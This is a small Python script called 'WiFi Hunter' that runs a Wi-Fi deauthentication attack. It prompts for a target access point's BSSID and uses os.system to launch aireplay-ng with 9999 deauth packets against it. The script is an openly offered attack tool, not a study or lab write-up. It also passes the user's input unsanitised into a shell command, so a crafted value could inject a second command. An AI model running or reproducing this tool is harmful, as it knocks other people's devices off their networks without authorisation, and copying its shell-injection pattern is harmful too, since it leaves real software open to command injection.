import os 
import time
from tqdm import tqdm 
import colorama
print(colorama.Fore.GREEN)
os.system("clear")

# WiFi Hunter banner
banner = '''
 ██╗    ██╗██╗███████╗██╗    ██╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
 ██║    ██║██║██╔════╝██║    ██║    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
 ██║ █╗ ██║██║█████╗  ██║ █╗ ██║    ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
 ██║███╗██║██║██╔══╝  ██║███╗██║    ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
 ╚███╔███╔╝██║███████╗╚███╔███╔╝    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
  ╚══╝╚══╝ ╚═╝╚══════╝ ╚══╝╚══╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                                                       
                                @vigneshthehacker
'''

print(banner)
print("                                     -------------------------   ")
print(" Type this commend in your termunal |  airodump-ng -i wlan0   |  ")
print("                                     -------------------------   ")
print("")
print()
print()


'''print(colorama.Fore.RED+'')
for _ in tqdm(range(101),
    desc = "",
    ascii = False,ncols=100):
    time.sleep(0.1)
print(colorama.Fore.GREEN+'') '''

bssid=input(" Enter your bssid:")

os.system(f"aireplay-ng --deauth 9999 -a {bssid} wlan0")



  